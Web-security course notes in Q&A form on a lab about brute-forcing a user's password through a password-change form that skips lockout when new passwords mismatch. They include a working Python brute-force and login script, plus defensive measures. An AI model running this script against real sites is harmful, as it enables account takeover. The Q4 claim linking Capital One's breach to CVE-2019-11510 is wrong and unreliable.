---
course: Web Security
topic: Authentication Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain why the password change functionality in the lab is vulnerable to brute force attacks.**

The password change functionality is vulnerable to brute force attacks due to a logic flaw in the application. Specifically, when the new passwords do not match, the application does not enforce a brute force protection mechanism such as a lockout period. This allows an attacker to repeatedly attempt different passwords without being locked out, effectively bypassing any brute force protection.

**Q2. How would you exploit the password change functionality to brute force Carlos' password?**

To exploit the password change functionality, you would follow these steps:

1. Use Burp Suite's Intruder to automate the process.
2. Set up the Intruder to send multiple requests with different candidate passwords.
3. Ensure that the new passwords do not match to bypass the brute force protection.
4. Monitor the responses for a successful attempt, indicated by a message like "new passwords do not match," which confirms the correct current password.

Here’s a simplified Python script to automate this process:

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def access_carlos_account(url):
    # Login with the regular user account
    login_url = url + '/login'
    login_data = {'username': 'regular_user', 'password': 'regular_password'}
    s = requests.Session()
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)
    
    # Brute force Carlos' password
    change_password_url = url + '/change-password'
    with open('passwords.txt', 'r') as f:
        lines = f.read().splitlines()
    for pwd in lines:
        change_password_data = {
            'username': 'Carlos',
            'currentPassword': pwd,
            'newPassword': 'password1',
            'confirmNewPassword': 'password2'
        }
        r = s.post(change_password_url, data=change_password_data, verify=False, proxies=proxies)
        if 'new passwords do not match' in r.text:
            print(f"Found Carlos' password: {pwd}")
            break
    
    # Log in with Carlos' password
    login_data['username'] = 'Carlos'
    login_data['password'] = pwd
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)
    if 'log out' in r.text:
        print("Successfully logged into Carlos' account.")
    else:
        print("Could not log into Carlos' account.")

if __name__ == "__main__":
    url = input("Enter the URL: ")
    access_carlos_account(url)
```

**Q3. Why is it important to ensure that the new passwords do not match during the brute force attempt?**

Ensuring that the new passwords do not match is crucial because it bypasses the brute force protection mechanism. When the new passwords do not match, the application does not enforce a lockout period, allowing the attacker to continue attempting different passwords without being blocked. This significantly speeds up the brute force process.

**Q4. What recent real-world examples demonstrate vulnerabilities similar to the one discussed in the lab?**

One recent example is the breach of the Capital One website in 2019 (CVE-2019-11510). The attacker exploited a vulnerability in the web application firewall configuration, which allowed unauthorized access to sensitive customer data. Although this specific vulnerability was related to improper configuration rather than a brute force attack, it highlights the importance of securing web applications against various types of attacks, including those that exploit logic flaws.

**Q5. How would you configure a web application to prevent brute force attacks on password change functionality?**

To prevent brute force attacks on password change functionality, you can implement the following measures:

1. **Rate Limiting**: Limit the number of password change attempts per user within a certain time frame.
2. **Lockout Mechanism**: Implement a lockout mechanism that temporarily disables the account after a certain number of failed attempts.
3. **Captcha**: Require users to pass a CAPTCHA challenge after a certain number of failed attempts to prevent automated attacks.
4. **Session Management**: Ensure that the password change request is tied to the user session and only allows changes for the authenticated user.
5. **Logging and Monitoring**: Implement logging and monitoring to detect and respond to suspicious activity quickly.

By combining these measures, you can significantly reduce the risk of brute force attacks on password change functionality.

---
<!-- nav -->
[[04-Understanding Authentication Vulnerabilities Password Brute Force via Password Change|Understanding Authentication Vulnerabilities Password Brute Force via Password Change]] | [[Web Security (PortSwigger)/13-Authentication Vulnerabilities/13-Lab 12 Password brute force via password change/00-Overview|Overview]]
